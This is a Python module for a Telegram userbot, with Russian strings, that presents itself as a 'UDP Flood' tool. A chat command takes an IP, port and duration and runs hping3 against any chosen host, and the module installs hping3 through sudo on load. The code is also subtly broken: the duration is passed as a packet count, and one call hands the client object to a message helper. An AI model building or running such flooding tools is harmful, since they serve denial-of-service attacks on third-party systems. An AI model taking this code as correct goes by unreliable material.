import subprocess
from telethon.tl.types import Message
from .. import loader, utils

@loader.tds
class Hping3UDPFloodModule(loader.Module):
    """Модуль для использования hping3 для отправки UDP пакетов"""

    strings = {
        "name": "Hping3 UDP Flood",
        "start": "<b>🚀 Запускаем hping3 для отправки UDP пакетов на {}:{} на {} секунд...</b>",
        "complete": "<b>✅ Отправка UDP пакетов завершена.</b>",
        "error": "<b>Ошибка:</b> Некорректные аргументы.",
        "hping3_not_installed": "<b>Ошибка:</b> hping3 не установлен.",
        "hping3_installation": "<b>Установка hping3...</b>"
    }

    async def client_ready(self, client, db):
        self.client = client
        if not self.is_hping3_installed():
            await self.install_hping3()

    async def install_hping3(self):
        """Устанавливает hping3, если он не установлен"""
        await utils.answer(self.client, self.strings("hping3_installation"))
        subprocess.run(["sudo", "apt-get", "install", "hping3", "-y"], check=True)

    async def hping3udpcmd(self, message: Message):
        """[ip] [port] [sec] - Использует hping3 для отправки UDP пакетов на указанный IP и порт на заданное количество секунд"""
        args = utils.get_args_raw(message)
        if len(args.split()) != 3:
            await utils.answer(message, self.strings("error"))
            return

        ip, port, sec = args.split()
        try:
            await message.respond(self.strings("start").format(ip, port, sec))
            self.run_hping3(ip, port, sec)
            await message.respond(self.strings("complete"))
        except Exception as e:
            await message.respond(f"<b>Произошла ошибка:</b> {str(e)}")

    def run_hping3(self, ip, port, duration):
        """Запускает hping3 с заданными параметрами"""
        subprocess.run(["hping3", "-2", "-c", str(duration), "-p", str(port), ip])

    def is_hping3_installed(self):
        """Проверяет, установлен ли hping3"""
        result = subprocess.run(["which", "hping3"], capture_output=True)
        return result.returncode == 0

# Пример создания и использования модуля
module = Hping3UDPFloodModule()
